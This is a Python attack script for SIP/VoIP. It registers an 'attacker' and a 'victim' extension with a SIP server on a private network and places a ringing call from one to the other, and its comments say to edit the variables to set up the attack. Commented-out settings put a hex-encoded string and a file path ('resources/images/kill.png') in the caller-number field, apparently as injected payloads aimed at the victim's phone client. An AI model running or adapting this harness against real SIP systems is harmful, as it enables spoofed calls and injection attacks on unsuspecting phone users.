import socket
from sip_client import SipClient


def encode(val) -> str:
    ret = ""
    for c in val:
        ret += "\\x%02x" % ord(c)
    return ret


class Attack:
    def __init__(self):
        # edit these variables to set up attack
        sip_host = "192.168.21.58"
        client_address = "192.168.20.53"
        self.victim_number = "1002"
        # attacker_number = encode("514353")
        # attacker_number="resources/images/kill.png"
        attacker_number = "1001"
        attacker_port = 52058
        victim_port = 53086
        self.attacker_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.victim_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.attacker_socket.bind((client_address, attacker_port))
        self.victim_socket.bind((client_address, victim_port))
        self.attacker_socket.connect((sip_host, 5060))
        self.victim_socket.connect((sip_host, 5060))
        self.attacker_client = SipClient(
            sip_host,
            client_address,
            attacker_number,
            attacker_port)
        self.victim_client = SipClient(
            sip_host,
            client_address,
            self.victim_number,
            victim_port)

    def register_victim(self):
        self.victim_socket.send(bytes(self.victim_client.register(300).encode('utf-8')))
        self.victim_socket.recv(8192)

    def register_attacker(self):
        self.attacker_socket.send(bytes(self.attacker_client.register(300).encode('utf-8')))
        self.attacker_socket.recv(8192)

    def initiate_call(self):
        # attacker send invite
        self.attacker_socket.send(bytes(self.attacker_client.invite_message(self.victim_number).encode('utf-8')))
        # attacker recive 100 trying
        self.attacker_socket.recv(8192)
        # vitcim recive invite trying
        invite = self.victim_socket.recv(8192)
        # vitcim send 100 trying
        self.victim_socket.send(bytes(self.victim_client.trying_100(invite.decode('utf-8')).encode('utf-8')))
        # vitcim send 180 ringing
        self.victim_socket.send(bytes(self.victim_client.ringing_180(invite.decode('utf-8')).encode('utf-8')))
        # attacker recive 180 ringing
        self.attacker_socket.recv(8192)

    def close_sockets(self):
        self.victim_socket.send(bytes(self.victim_client.register(0).encode('utf-8')))
        self.victim_socket.recv(8192)
        self.attacker_socket.close()
        self.victim_socket.close()
